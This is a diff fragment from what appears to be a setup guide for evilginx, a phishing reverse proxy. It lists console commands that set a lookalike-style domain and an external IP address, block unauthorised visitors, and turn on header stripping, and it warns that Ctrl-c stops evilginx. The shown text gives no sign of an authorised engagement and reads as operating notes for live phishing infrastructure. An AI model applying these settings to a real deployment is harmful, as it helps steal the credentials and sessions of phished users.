@@ -193,6 +193,7 @@ NEVER use Ctrl-c or type `exit` in the console — that stops evilginx.
 config domain officialmonsterz.store
 config ipv4 external 45.155.249.220
 blacklist unauth
+config strip_headers on
 ```
 
 Expected replies:
